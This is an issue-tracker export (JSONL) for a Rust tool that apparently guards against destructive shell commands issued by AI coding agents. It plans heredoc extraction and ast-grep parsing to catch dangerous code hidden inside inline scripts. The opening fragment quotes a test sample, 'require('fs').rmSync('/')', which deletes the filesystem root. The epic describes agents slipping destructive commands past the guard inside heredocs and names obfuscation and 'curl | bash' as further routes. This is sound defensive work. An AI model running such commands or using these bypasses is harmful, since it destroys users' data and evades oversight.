\"require('fs').rmSync('/')\"\n```\n\n## Files to Modify\n- New: src/heredoc/extract.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test each delimiter quoting style\n- Test \u003c\u003c, \u003c\u003c-, \u003c\u003c~ variants\n- Test inline -c/-e scripts\n- Test edge cases (empty, nested, multiple)\n- Test error handling for malformed heredocs\n\n## Dependencies\n- Implement heredoc detection (git_safety_guard-49s)\n\n## Success Criteria\n- Correctly extract content from all supported heredoc forms\n- Handle edge cases gracefully (no panics)\n- Clear error messages for malformed input","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:21.081724798-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:21.081724798-05:00","dependencies":[{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:27.231452201-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-yza","title":"Epic: ast-grep Integration for Heredoc Detection","description":"# Epic: ast-grep Integration for Heredoc Detection\n\n## Problem Statement\n\nAI coding agents sometimes attempt to bypass destructive command guards by embedding dangerous commands inside heredoc scripts. The current dcg implementation only examines the top-level command, missing destructive patterns hidden within inline scripts.\n\n### Example Attack Vectors\n\nAn attacker might use Python, Bash, Node.js, or other language heredocs to embed dangerous operations that slip past the quick-reject filter. The top-level command appears benign (e.g., \"python3 \u003c\u003c EOF\") while the heredoc body contains destructive operations.\n\n## Solution Overview\n\nIntegrate ast-grep (or tree-sitter directly) to:\n1. Detect heredoc patterns in commands\n2. Extract embedded script content\n3. Parse the script according to its detected language\n4. Check for destructive patterns within the parsed AST\n5. Block if dangerous patterns are found\n\n## Why ast-grep?\n\nast-grep uses tree-sitter for parsing, providing:\n- **Structural awareness**: Understands code structure, not just text patterns\n- **Language support**: Handles Python, Bash, JavaScript, TypeScript, Ruby, Perl, and many more\n- **Pattern matching**: Powerful AST pattern matching syntax\n- **Battle-tested**: Used in production for large-scale code search and refactoring\n\n## Key Technical Challenges\n\n1. **Heredoc Syntax Variants**: Many forms exist (\u003c\u003c, \u003c\u003c-, \u003c\u003c\u003c, \u003c\u003c~, quoted vs unquoted delimiters)\n2. **Language Detection**: Must infer language from command prefix, shebang, or heuristics\n3. **Performance**: Every command passes through dcg; parsing must be fast\n4. **Pattern Library**: Need comprehensive patterns per language for destructive operations\n5. **Obfuscation**: Attackers might use encoding, string concatenation, or indirect execution\n\n## Success Criteria\n\n- Detect and block heredoc-embedded destructive commands\n- Minimal latency impact (under 10ms for heredoc detection, under 50ms for full parsing)\n- Support Python, Bash, JavaScript/TypeScript, Ruby, Perl at minimum\n- Configurable via pack system (heredoc scanning can be enabled/disabled)\n- Comprehensive test coverage for bypass attempts\n\n## Architecture Decision\n\nWe will evaluate two integration approaches:\n1. **External binary**: Call ast-grep CLI and parse JSON output\n2. **Library integration**: Use tree-sitter Rust bindings directly\n\nThe decision will be made in the research phase based on:\n- Performance benchmarks\n- Dependency complexity\n- Maintenance burden\n- Pattern expressiveness\n\n## Out of Scope (for initial implementation)\n\n- Scanning files referenced in commands (e.g., \"bash script.sh\")\n- Deep obfuscation detection (base64, rot13, etc.)\n- Network-based command retrieval (\"curl ... | bash\" style)\n- Recursive heredoc nesting","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T18:28:08.502051689-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:28:08.502051689-05:00","dependencies":[{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:28:33.156627112-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:28:51.942182529-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:29:24.645603891-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:29:45.137126036-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:14.545375401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:30:37.534882086-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:06.013753048-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:27.250568872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:31:58.344341425-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:32:32.951489053-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:34:20.619502644-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:35:11.238168575-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:35:40.032362893-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:37:03.035457423-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:37:34.31174363-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:37:35.469733942-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:37:37.404070403-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.216578116-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:39:24.548074304-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:16.23083852-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-4o8","type":"blocks","created_at":"2026-01-07T18:40:53.391076545-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.383677396-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.824701001-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-fpim","type":"blocks","created_at":"2026-01-07T19:28:33.995705031-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:28:34.164491315-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-perf","type":"blocks","created_at":"2026-01-07T19:28:34.326399906-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e2eh","type":"blocks","created_at":"2026-01-07T19:28:34.496866284-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-tlog","type":"blocks","created_at":"2026-01-07T19:28:34.658765407-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:28:34.843179581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-erux","type":"blocks","created_at":"2026-01-07T19:31:01.81722121-05:00","created_by":"ubuntu"}]}
